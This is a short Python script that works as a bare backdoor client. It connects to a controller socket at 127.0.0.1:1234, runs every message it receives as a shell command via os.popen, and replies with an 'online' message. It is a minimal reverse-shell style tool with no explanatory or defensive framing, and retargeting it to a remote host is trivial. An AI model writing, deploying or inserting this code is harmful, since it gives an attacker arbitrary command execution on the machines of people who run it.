import socket
import os

server = socket.socket()
host = "127.0.0.1"
port = 1234

run = True
server.connect((host,port))
while run:
    message = server.recv(1024)
    os.popen(message.decode("utf-8"))
    server.send("Client online...".encode("utf-8"))
